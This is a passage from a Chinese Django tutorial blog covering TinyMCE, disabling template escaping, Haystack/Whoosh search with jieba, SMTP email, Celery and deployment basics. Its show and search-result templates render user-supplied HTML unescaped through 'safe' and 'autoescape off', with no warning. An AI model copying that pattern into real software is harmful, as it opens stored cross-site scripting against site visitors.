<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-27-21-36-06.png" class="">

<p>4）打开 py_django 虚拟环境的目录，找到 tinymce 的目录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.virtualenvs/py_django/lib/python3.5/site-packages/tinymce/static/tiny_mce</span><br></pre></td></tr></table></figure>

<p>5）拷贝 <code>tiny_mce_src.js</code> 文件、langs 文件夹以及 themes 文件夹拷贝到项目目录下的 <code>static/js/</code> 目录下。</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-27-21-37-02.png" class="">

<p>6）在 <code>test6/settings.py</code> 中配置静态文件查找路径。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STATICFILES_DIRS=[</span><br><span class="line">    os.path.join(BASE_DIR,&#x27;statics&#x27;),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>7）在 <code>templates/booktest/</code> 目录下创建 <code>editor.html</code> 模板。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;自定义使用tinymce&lt;/title&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot; src=&#x27;/statics/js/tiny_mce_src.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        tinyMCE.init(&#123;</span><br><span class="line">            &#x27;mode&#x27;:&#x27;textareas&#x27;,</span><br><span class="line">            &#x27;theme&#x27;:&#x27;advanced&#x27;,</span><br><span class="line">            &#x27;width&#x27;:400,</span><br><span class="line">            &#x27;height&#x27;:100</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;#&quot;&gt;</span><br><span class="line">    &lt;textarea name=&#x27;gcontent&#x27;&gt;哈哈，这是啥呀&lt;/textarea&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>8）运行服务器，在浏览器中输入如下网址：</p>
<p><a href="http://127.0.0.1:8000/editor/">http://127.0.0.1:8000/editor/</a></p>
<p>浏览效果如下图：</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-27-21-54-29.png" class="">

<h3 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h3><p>通过富文本编辑器产生的字符串是包含 html 的。 在数据库中查询如下图：</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-28-15-50-10.png" class="">

<p>在模板中显示字符串时，默认会进行 html 转义，如果想正常显示需要关闭转义。</p>
<p>问：在模板中怎么关闭转义</p>
<ul>
<li>方式一：过滤器 safe</li>
<li>方式二：标签 autoescape off</li>
</ul>
<p>1）在 <code>booktest/views.py</code> 中定义视图 show，用于显示富文本编辑器的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from booktest.models import *</span><br><span class="line">...</span><br><span class="line">def show(request):</span><br><span class="line">    goods=GoodsInfo.objects.get(pk=1)</span><br><span class="line">    context=&#123;&#x27;g&#x27;:goods&#125;</span><br><span class="line">    return render(request,&#x27;booktest/show.html&#x27;,context)</span><br></pre></td></tr></table></figure>

<p>2）在 <code>booktest/urls.py</code> 中配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^show/&#x27;, views.show),</span><br></pre></td></tr></table></figure>

<p>3）在 <code>templates/booktest/</code> 目录下创建 <code>show.html</code> 模板。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;展示富文本编辑器内容&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">id:&#123;&#123;g.id&#125;&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&#123;%autoescape off%&#125;</span><br><span class="line">&#123;&#123;g.gcontent&#125;&#125;</span><br><span class="line">&#123;%endautoescape%&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&#123;&#123;g.gcontent|safe&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）运行服务器，在浏览器中输入如下网址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/show/</span><br></pre></td></tr></table></figure>

<p>浏览效果如下图：</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-28-18-42-12.png" class="">

<h1 id="全文检索"><a href="#全文检索" class="headerlink" title="全文检索"></a>全文检索</h1><p>全文检索不同于特定字段的模糊查询，使用全文检索的效率更高，并且能够对于中文进行分词处理。</p>
<p>haystack：全文检索的框架，支持 whoosh、solr、Xapian、Elasticsearc 四种全文检索引擎，点击查看<a href="http://haystacksearch.org/">官方网站</a>。<br>whoosh：纯 Python 编写的全文搜索引擎，虽然性能比不上 sphinx、xapian、Elasticsearc 等，但是无二进制包，程序不会莫名其妙的崩溃，对于小型的站点，whoosh 已经足够使用，点击查看<a href="https://whoosh.readthedocs.io/en/latest/">whoosh 文档</a>。<br>jieba：一款免费的中文分词包，如果觉得不好用可以使用一些收费产品。</p>
<p>1）在虚拟环境中依次安装需要的包。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install django-haystack</span><br><span class="line">pip install whoosh</span><br><span class="line">pip install jieba</span><br></pre></td></tr></table></figure>

<p>2）修改 <code>test6/settings.py</code> 文件，安装应用 haystack 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = (</span><br><span class="line">    ...</span><br><span class="line">    &#x27;haystack&#x27;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>3）在 <code>test6/settings.py</code> 文件中配置搜索引擎。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">HAYSTACK_CONNECTIONS = &#123;</span><br><span class="line">    &#x27;default&#x27;: &#123;</span><br><span class="line">        #使用whoosh引擎</span><br><span class="line">        &#x27;ENGINE&#x27;: &#x27;haystack.backends.whoosh_cn_backend.WhooshEngine&#x27;,</span><br><span class="line">        #索引文件路径</span><br><span class="line">        &#x27;PATH&#x27;: os.path.join(BASE_DIR, &#x27;whoosh_index&#x27;),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#当添加、修改、删除数据时，自动生成索引</span><br><span class="line">HAYSTACK_SIGNAL_PROCESSOR = &#x27;haystack.signals.RealtimeSignalProcessor&#x27;</span><br></pre></td></tr></table></figure>

<p>4）在 <code>test6/urls.py</code> 中添加搜索的配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^search/&#x27;, include(&#x27;haystack.urls&#x27;)),</span><br></pre></td></tr></table></figure>

<h2 id="创建引擎及索引"><a href="#创建引擎及索引" class="headerlink" title="创建引擎及索引"></a>创建引擎及索引</h2><p>1）在 booktest 目录下创建 <code>search_indexes.py</code> 文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from haystack import indexes</span><br><span class="line">from booktest.models import GoodsInfo</span><br><span class="line">#指定对于某个类的某些数据建立索引</span><br><span class="line">class GoodsInfoIndex(indexes.SearchIndex, indexes.Indexable):</span><br><span class="line">    text = indexes.CharField(document=True, use_template=True)</span><br><span class="line"></span><br><span class="line">    def get_model(self):</span><br><span class="line">        return GoodsInfo</span><br><span class="line"></span><br><span class="line">    def index_queryset(self, using=None):</span><br><span class="line">        return self.get_model().objects.all()</span><br></pre></td></tr></table></figure>

<p>2）在 templates 目录下创建 <code>search/indexes/booktest/</code> 目录, 并在该目录中创建 <code>goodsinfo_text.txt</code> 文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#指定索引的属性</span><br><span class="line">&#123;&#123;object.gcontent&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-28-20-16-58.png" class="">

<p>4）找到虚拟环境 py_django 下的 haystack 目录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.virtualenvs/py_django/lib/python3.5/site-packages/haystack/backends/</span><br></pre></td></tr></table></figure>

<p>5）在上面的目录中创建 <code>ChineseAnalyzer.py</code> 文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import jieba</span><br><span class="line">from whoosh.analysis import Tokenizer, Token</span><br><span class="line"></span><br><span class="line">class ChineseTokenizer(Tokenizer):</span><br><span class="line">    def __call__(self, value, positions=False, chars=False,</span><br><span class="line">                 keeporiginal=False, removestops=True,</span><br><span class="line">                 start_pos=0, start_char=0, mode=&#x27;&#x27;, **kwargs):</span><br><span class="line">        t = Token(positions, chars, removestops=removestops, mode=mode,</span><br><span class="line">                  **kwargs)</span><br><span class="line">        seglist = jieba.cut(value, cut_all=True)</span><br><span class="line">        for w in seglist:</span><br><span class="line">            t.original = t.text = w</span><br><span class="line">            t.boost = 1.0</span><br><span class="line">            if positions:</span><br><span class="line">                t.pos = start_pos + value.find(w)</span><br><span class="line">            if chars:</span><br><span class="line">                t.startchar = start_char + value.find(w)</span><br><span class="line">                t.endchar = start_char + value.find(w) + len(w)</span><br><span class="line">            yield t</span><br><span class="line"></span><br><span class="line">def ChineseAnalyzer():</span><br><span class="line">    return ChineseTokenizer()</span><br></pre></td></tr></table></figure>

<p>6）复制 <code>whoosh_backend.py</code> 文件，改为 <code>whoosh_cn_backend.py</code> 名称：</p>
<p>7）打开复制出来的新文件，引入中文分析类，内部采用 jieba 分词。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from .ChineseAnalyzer import ChineseAnalyzer</span><br></pre></td></tr></table></figure>

<p>8）更改词语分析类。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查找</span><br><span class="line">analyzer=StemmingAnalyzer()</span><br><span class="line">改为</span><br><span class="line">analyzer=ChineseAnalyzer()</span><br></pre></td></tr></table></figure>

<p>9）初始化索引数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py rebuild_index</span><br></pre></td></tr></table></figure>

<p>10）按提示输入 y 后回车，生成索引。</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-28-20-24-18.png" class="">

<p>11）索引生成后目录结构如下图：</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-28-20-25-07.png" class="">

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>按照配置，在 admin 管理中添加数据后，会自动为数据创建索引，可以直接进行搜索，可以先创建一些测试数据。</p>
<p>1）在 <code>booktest/views.py</code> 中定义视图 query 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def query(request):</span><br><span class="line">    return render(request,&#x27;booktest/query.html&#x27;)</span><br></pre></td></tr></table></figure>

<p>2）在 <code>booktest/urls.py</code> 中配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^query/&#x27;, views.query),</span><br></pre></td></tr></table></figure>

<p>3）在 <code>templates/booktest/</code> 目录中创建模板 <code>query.html</code> 。</p>
<blockquote>
<p>参数 q 表示搜索内容，传递到模板中的数据为 query。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;全文检索&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&#x27;get&#x27; action=&quot;/search/&quot; target=&quot;_blank&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;q&quot;&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;查询&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）自定义搜索结果模板：在 templates&#x2F;search&#x2F;目录下创建 search.html。</p>
<p>搜索结果进行分页，视图向模板中传递的上下文如下：</p>
<ul>
<li>query：搜索关键字</li>
<li>page：当前页的 page 对象</li>
<li>paginator：分页 paginator 对象</li>
</ul>
<p>视图接收的参数如下：</p>
<ul>
<li>参数 q 表示搜索内容，传递到模板中的数据为 query</li>
<li>参数 page 表示当前页码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;全文检索--结果页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;搜索&amp;nbsp;&lt;b&gt;&#123;&#123;query&#125;&#125;&lt;/b&gt;&amp;nbsp;结果如下：&lt;/h1&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&#123;%for item in page%&#125;</span><br><span class="line">    &lt;li&gt;&#123;&#123;item.object.id&#125;&#125;--&#123;&#123;item.object.gcontent|safe&#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;%empty%&#125;</span><br><span class="line">    &lt;li&gt;啥也没找到&lt;/li&gt;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&#123;%for pindex in page.paginator.page_range%&#125;</span><br><span class="line">    &#123;%if pindex == page.number%&#125;</span><br><span class="line">        &#123;&#123;pindex&#125;&#125;&amp;nbsp;&amp;nbsp;</span><br><span class="line">    &#123;%else%&#125;</span><br><span class="line">        &lt;a href=&quot;?q=&#123;&#123;query&#125;&#125;&amp;amp;page=&#123;&#123;pindex&#125;&#125;&quot;&gt;&#123;&#123;pindex&#125;&#125;&lt;/a&gt;&amp;nbsp;&amp;nbsp;</span><br><span class="line">    &#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>5）运行服务器，在浏览器中输入如下地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/query/</span><br></pre></td></tr></table></figure>

<p>在文本框中填写要搜索的信息，点击”搜索“按钮。</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-28-20-37-53.png" class="">

<p>搜索结果如下：</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-28-20-38-29.png" class="">

<h1 id="发送邮件"><a href="#发送邮件" class="headerlink" title="发送邮件"></a>发送邮件</h1><p>Django 中内置了邮件发送功能，被定义在 django.core.mail 模块中。发送邮件需要使用 SMTP 服务器，常用的免费服务器有：163、126、QQ，下面以 163 邮件为例。</p>
<p>1）注册 163 邮箱，登录后设置。</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-28-20-41-53.png" class="">

<p>2）在新页面中点击“客户端授权密码”，开启授权码。</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-28-20-50-06.png" class="">

<p>3）打开 <code>test6/settings.py</code>文件，点击下图配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EMAIL_BACKEND = &#x27;django.core.mail.backends.smtp.EmailBackend&#x27;</span><br><span class="line">EMAIL_HOST = &#x27;smtp.163.com&#x27;</span><br><span class="line">EMAIL_PORT = 25</span><br><span class="line">#发送邮件的邮箱</span><br><span class="line">EMAIL_HOST_USER = &#x27;xxx@163.com&#x27;</span><br><span class="line">#在邮箱中设置的客户端授权密码</span><br><span class="line">EMAIL_HOST_PASSWORD = &#x27;xxx&#x27;</span><br><span class="line">#收件人看到的发件人</span><br><span class="line">EMAIL_FROM = &#x27;python&lt;xxx@163.com&gt;&#x27;</span><br></pre></td></tr></table></figure>

<p>6）在 <code>booktest/views.py</code> 文件中新建视图 send。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.conf import settings</span><br><span class="line">from django.core.mail import send_mail</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line">...</span><br><span class="line">def send(request):</span><br><span class="line">    msg = msg=&#x27;&lt;a href=&quot;https://ckcat.github.io/&quot; target=&quot;_blank&quot;&gt;点击激活&lt;/a&gt;&#x27;</span><br><span class="line">    send_mail(&#x27;注册激活&#x27;, &#x27;&#x27;, settings.EMAIL_FROM,</span><br><span class="line">              [&#x27;ckcatck@qq.com&#x27;],</span><br><span class="line">              html_message=msg)</span><br><span class="line">    return HttpResponse(&quot;OK&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>7）在 <code>booktest/urls.py</code> 文件中配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^send/$&#x27;,views.send),</span><br></pre></td></tr></table></figure>

<p>8）启动服务器，在浏览器中输入如下网址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/send/</span><br></pre></td></tr></table></figure>

<p>邮件发送成功后，在邮箱中查看邮件如下图：</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-28-21-17-27.png" class="">

<h1 id="celery"><a href="#celery" class="headerlink" title="celery"></a>celery</h1><p>情景：用户发起 request，并等待 response 返回。在本些 views 中，可能需要执行一段耗时的程序，那么用户就会等待很长时间，造成不好的用户体验，比如发送邮件、手机验证码等。</p>
<p>使用 celery 后，情况就不一样了。解决：将耗时的程序放到 celery 中执行。</p>
<ul>
<li>点击查看<a href="http://www.celeryproject.org/">celery 官方网站</a></li>
<li>点击查看<a href="http://docs.jinkan.org/docs/celery/">celery 中文文档</a></li>
</ul>
<p>celery 名词：</p>
<ul>
<li>任务 task：就是一个 Python 函数。</li>
<li>队列 queue：将需要执行的任务加入到队列中。</li>
<li>工人 worker：在一个新进程中，负责执行队列中的任务。</li>
<li>代理人 broker：负责调度，在布置环境中使用 redis。</li>
</ul>
<p>安装包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">celery==3.1.25</span><br><span class="line">django-celery==3.1.17</span><br></pre></td></tr></table></figure>

<h1 id="布署"><a href="#布署" class="headerlink" title="布署"></a>布署</h1><p>当项目开发完成后，需要将项目代码放到服务器上，这个服务器拥有固定的 IP，再通过域名绑定，就可以供其它人浏览，对于 python web 开发，可以使用 wsgi、apache 服务器，此处以 wsgi 为例进行布署。</p>
<p>服务器首先是物理上的一台性能高、线路全、运行稳定的机器，分为私有服务器、公有服务器。</p>
<ul>
<li>私有服务器：公司自己购买、自己维护，只布署自己的应用，可供公司内部或外网访问，成本高，需要专业人员维护，适合大公司使用。</li>
<li>公有服务器：集成好运营环境，销售空间或主机，供其布署自己的应用，适合初创公司使用，成本低。</li>
</ul>
<p>常用的公有服务器，如阿里云、青云等，可按流量收费或按时间收费。服务器还需要安装服务器软件，此处需要 uWSGI、Nginx。</p>
<p>服务器架构如下图：</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-29-13-47-34.png" class="">
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Django学习-视图</title>
    <url>/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/</url>
    <content><![CDATA[<!-- TOC -->

<ul>
<li><a href="#%E8%A7%86%E5%9B%BE">视图</a><ul>
<li><a href="#%E5%88%9B%E5%BB%BA%E7%A4%BA%E4%BE%8B%E9%A1%B9%E7%9B%AE">创建示例项目</a><ul>
<li><a href="#%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE-test3">创建项目 test3</a></li>
<li><a href="#%E8%BF%9B%E5%85%A5%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E5%88%9B%E5%BB%BA%E5%BA%94%E7%94%A8-booktest">进入项目目录，创建应用 booktest</a></li>
<li><a href="#%E5%9C%A8-test3settingspy-%E4%B8%AD-installed_apps-%E9%A1%B9%E5%AE%89%E8%A3%85%E5%BA%94%E7%94%A8">在 test3&#x2F;settings.py 中 INSTALLED_APPS 项安装应用</a></li>
<li><a href="#%E5%9C%A8-test3settingspy-%E4%B8%AD-databases-%E9%A1%B9%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-mysql-%E6%95%B0%E6%8D%AE%E5%BA%93-test2">在 test3&#x2F;settings.py 中 DATABASES 项配置使用 MySQL 数据库 test2</a></li>
<li><a href="#%E5%9C%A8-test3settingspy-%E4%B8%AD-templates-%E9%A1%B9%E9%85%8D%E7%BD%AE%E6%A8%A1%E6%9D%BF%E6%9F%A5%E6%89%BE%E8%B7%AF%E5%BE%84">在 test3&#x2F;settings.py 中 TEMPLATES 项配置模板查找路径</a></li>
<li><a href="#%E5%88%9B%E5%BB%BA%E6%A8%A1%E6%9D%BF%E7%9B%AE%E5%BD%95-test3templatesbooktest-">创建模板目录 test3&#x2F;templates&#x2F;booktest 。</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E8%A7%86%E5%9B%BE">使用视图</a></li>
<li><a href="#%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1">启动服务</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#urlconf">URLconf</a><ul>
<li><a href="#%E9%85%8D%E7%BD%AE">配置</a><ul>
<li><a href="#%E5%9C%A8-test3settingspy-%E4%B8%AD%E9%80%9A%E8%BF%87-root_urlconf-%E6%8C%87%E5%AE%9A-url-%E9%85%8D%E7%BD%AE%E9%BB%98%E8%AE%A4%E5%B7%B2%E7%BB%8F%E6%9C%89%E6%AD%A4%E9%85%8D%E7%BD%AE">在 test3&#x2F;settings.py 中通过 ROOT_URLCONF 指定 url 配置，默认已经有此配置。</a></li>
<li><a href="#%E6%89%93%E5%BC%80-test3urlspy-%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE">打开 test3&#x2F;urls.py 可以看到默认配置。</a></li>
</ul>
</li>
<li><a href="#%E8%AF%AD%E6%B3%95">语法</a><ul>
<li><a href="#%E8%AF%AD%E6%B3%95%E4%B8%80">语法一</a></li>
<li><a href="#%E8%AF%AD%E6%B3%95%E4%BA%8C">语法二</a></li>
</ul>
</li>
<li><a href="#%E8%8E%B7%E5%8F%96%E5%80%BC">获取值</a><ul>
<li><a href="#%E6%96%B9%E5%BC%8F%E4%B8%80%E4%BD%8D%E7%BD%AE%E5%8F%82%E6%95%B0">方式一：位置参数</a></li>
<li><a href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%E5%85%B3%E9%94%AE%E5%AD%97%E5%8F%82%E6%95%B0">方式二：关键字参数</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E8%A7%86%E5%9B%BE">视图</a><ul>
<li><a href="#%E5%86%85%E7%BD%AE%E9%94%99%E8%AF%AF%E8%A7%86%E5%9B%BE">内置错误视图</a><ul>
<li><a href="#%E9%94%99%E8%AF%AF%E5%8F%8A%E8%A7%86%E5%9B%BE">错误及视图</a></li>
<li><a href="#%E9%94%99%E8%AF%AF%E5%8F%8A%E8%A7%86%E5%9B%BE">错误及视图</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#httpreqeust-%E5%AF%B9%E8%B1%A1">HttpReqeust 对象</a><ul>
<li><a href="#%E5%B1%9E%E6%80%A7">属性</a></li>
<li><a href="#%E7%A4%BA%E4%BE%8B">示例</a><ul>
<li><a href="#pathencoding">path、encoding</a></li>
<li><a href="#method">method</a></li>
</ul>
</li>
<li><a href="#querydict-%E5%AF%B9%E8%B1%A1">QueryDict 对象</a></li>
<li><a href="#get-%E5%B1%9E%E6%80%A7">GET 属性</a></li>
<li><a href="#post-%E5%B1%9E%E6%80%A7">POST 属性</a><ul>
<li><a href="#%E7%A4%BA%E4%BE%8B">示例</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#httpresponse-%E5%AF%B9%E8%B1%A1">HttpResponse 对象</a><ul>
<li><a href="#%E5%B1%9E%E6%80%A7">属性</a></li>
<li><a href="#%E6%96%B9%E6%B3%95">方法</a></li>
<li><a href="#%E7%A4%BA%E4%BE%8B">示例</a><ul>
<li><a href="#%E7%9B%B4%E6%8E%A5%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE">直接返回数据</a></li>
<li><a href="#%E8%B0%83%E7%94%A8%E6%A8%A1%E6%9D%BF">调用模板</a></li>
<li><a href="#%E8%B0%83%E7%94%A8%E6%A8%A1%E6%9D%BF%E7%AE%80%E5%86%99%E5%87%BD%E6%95%B0-render">调用模板简写函数 render</a></li>
</ul>
</li>
<li><a href="#%E5%AD%90%E7%B1%BB-jsonresponse">子类 JsonResponse</a><ul>
<li><a href="#%E7%A4%BA%E4%BE%8B">示例</a></li>
</ul>
</li>
<li><a href="#%E5%AD%90%E7%B1%BB-httpresponseredirect">子类 HttpResponseRedirect</a><ul>
<li><a href="#%E7%A4%BA%E4%BE%8B">示例</a></li>
<li><a href="#%E9%87%8D%E5%AE%9A%E5%90%91%E7%AE%80%E5%86%99%E5%87%BD%E6%95%B0-redirect">重定向简写函数 redirect</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E7%8A%B6%E6%80%81%E4%BF%9D%E6%8C%81">状态保持</a><ul>
<li><a href="#cookie">Cookie</a><ul>
<li><a href="#cookie-%E7%9A%84%E7%89%B9%E7%82%B9">Cookie 的特点</a></li>
<li><a href="#%E8%AE%BE%E7%BD%AE-cookie">设置 Cookie</a></li>
<li><a href="#%E8%AF%BB%E5%8F%96-cookie">读取 Cookie</a></li>
</ul>
</li>
<li><a href="#session">Session</a><ul>
<li><a href="#%E5%90%AF%E7%94%A8-session">启用 Session</a></li>
<li><a href="#%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F">存储方式</a></li>
<li><a href="#%E4%BE%9D%E8%B5%96%E4%BA%8E-cookie">依赖于 Cookie</a></li>
<li><a href="#%E5%AF%B9%E8%B1%A1%E5%8F%8A%E6%96%B9%E6%B3%95">对象及方法</a></li>
<li><a href="#%E7%A4%BA%E4%BE%8B">示例</a><ul>
<li><a href="#%E5%86%99-session">写 session</a></li>
<li><a href="#%E8%AF%BB-session">读 session</a></li>
<li><a href="#%E5%88%A0%E9%99%A4">删除</a></li>
<li><a href="#%E5%88%A0%E9%99%A4-session">删除 session</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- /TOC -->

<h1 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h1><p>视图的功能</p>
<p>视图负责接受 Web 请求 HttpRequest，进行逻辑处理，返回 Web 响应 HttpResponse 给请求者。</p>
<h2 id="创建示例项目"><a href="#创建示例项目" class="headerlink" title="创建示例项目"></a>创建示例项目</h2><h3 id="1-创建项目-test3"><a href="#1-创建项目-test3" class="headerlink" title="1. 创建项目 test3"></a>1. 创建项目 test3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">django-admin startproject test3</span><br></pre></td></tr></table></figure>

<h3 id="2-进入项目目录，创建应用-booktest"><a href="#2-进入项目目录，创建应用-booktest" class="headerlink" title="2. 进入项目目录，创建应用 booktest"></a>2. 进入项目目录，创建应用 booktest</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd test3</span><br><span class="line">test3 python manage.py startapp booktest</span><br></pre></td></tr></table></figure>

